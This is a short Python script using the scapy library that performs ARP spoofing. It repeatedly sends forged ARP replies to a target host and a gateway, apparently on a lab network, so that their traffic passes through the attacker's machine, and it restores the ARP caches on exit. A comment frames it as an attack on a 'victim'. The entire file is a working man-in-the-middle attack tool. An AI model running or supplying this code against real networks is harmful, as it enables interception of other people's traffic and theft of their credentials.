#!/usr/bin/env python

# This  script makes it possible to change the target mac address of your victim to your own choosing

import time
import scapy.all as scapy
import sys


def get_mac_address(ip):
    if not ip:
        print("No input given. Existing program")
        exit()

    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]

    return answered_list[0][1].hwsrc


def restore(source_ip, destination_ip):
    source_mac = get_mac_address(source_ip)
    destination_mac = get_mac_address(destination_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)


def spoof(target_ip, spoof_ip):
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=get_mac_address(target_ip), psrc=spoof_ip)
    scapy.send(packet, verbose=False)


target_ip = "10.0.2.21"
gateway_ip = "10.0.2.1"
packet_counter = 0
try:
    while True:
        spoof(target_ip, gateway_ip)
        spoof(gateway_ip, target_ip)
        packet_counter = packet_counter + 2
        print("\r[+] Number of packets sent are " + str(packet_counter), end="")
        time.sleep(2)
except KeyboardInterrupt:
    print("\n[+] Exiting program and restoring IP")
    restore(target_ip, gateway_ip)
    restore(gateway_ip, target_ip)
    print("[+] Restoring done!")

